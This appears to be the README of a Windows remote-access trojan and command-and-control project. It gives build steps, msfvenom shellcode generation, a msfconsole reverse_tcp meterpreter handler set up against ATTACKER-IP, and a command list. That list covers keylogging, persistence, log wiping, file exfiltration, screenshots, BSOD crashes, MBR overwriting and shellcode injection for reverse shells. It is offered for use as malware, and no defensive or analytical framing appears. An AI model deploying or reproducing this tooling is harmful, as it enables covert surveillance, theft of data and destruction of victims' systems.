# Setup

After cloning the whole project and getting inside of the x64 folder:

1. If you want to be able to use inject64, startcat and the fallback shell, you must open Client.c, and generate the shellcodes with the msfvenom command commented at line 56, 57 and 58, and paste the output, replacing the contents of the variables at lines 60, 63, 66 (Change the LHOST/LPORT accordingly to your needs).

2. If you want to always spawn a fallback shell, you must set 'UseFallBackShell' at line 34 to 1. If you do, always make sure you first start the listener, or the client will crash. Run './Server menu' and read the startcat command to get more information about setting listeners correctly.

3. Now the IP address of the server can be provided using an argument. So, you can now compile everything by running the following:
```bash
x86_64-w64-mingw32-gcc -o Client.exe Client.c -lws2_32 -lwininet -lgdi32 -lntdll && gcc Server.c -o Server && echo "Compilation Successful"
```

4. If everything went correctly, the string "Compilation Successful" should popup in your terminal. If not, there was an error when trying to compile. Make sure you did everything correctly and try again.

5. To run the Server, run: ./Server start ATTACKER-IP

6. To run the Client from a Windows target, run: Client.exe ATTACKER-IP

7. Before using 'inject64', open a new terminal tab, load msfconsole, and paste the lines below:
```bash
use exploit/multi/handler
set LHOST SERVER-IP
set LPORT ATTACKER-PORT
set payload windows/x64/meterpreter/reverse_tcp
run
```

# Commands

q : Closes the connection with the client and exits.

menu : Prints the menu showing all available commands.

startlogger : Starts logging keystrokes and saves them to a file called 'out.txt' on the client machine.

stoplogger : Stops logging keystrokes.

persistence1 -> persistence5 : Uses hardcoded paths to establish persistence. (persistence4 and persistence5 require Administrator privileges)

removepers : Removes all hardcoded persistence methods used on the remote host.

isvm : Performs basic checks to determine whether the client is running inside a virtual machine and returns the results.

isadmin : Verifies whether the server has administrative privileges.

cleanlogs : Removes the Event Viewer logs.

updateurl : Updates the URL used to download files on the remote host.

download : Downloads a file to the remote host using the URL and a specified filename.

getfile : Retrieves a file from the remote host and transfers it to the server.

diskspace : Returns the disk space for the C: drive.

drives : Enumerates all connected drives.

screenshot : Takes a screenshot of the remote host's desktop and transfers it to the server.

cleanbin : Cleans the recycle bin (No popup).

hostname : Retrieves the hostname of the remote host.

popup : Spawns a visible popup on the remote host (For debug).

bsodwin : Crashes the remote host, causing a BSOD (Blue Screen of Death).

wipembr : Overwrites the MBR on the remote host.

inject64 : Spawns a new Notepad process and injects shellcode into it to establish a reverse shell connection to the msfconsole listener.

startcat : Injects shellcode to connect to a listener running on the server.
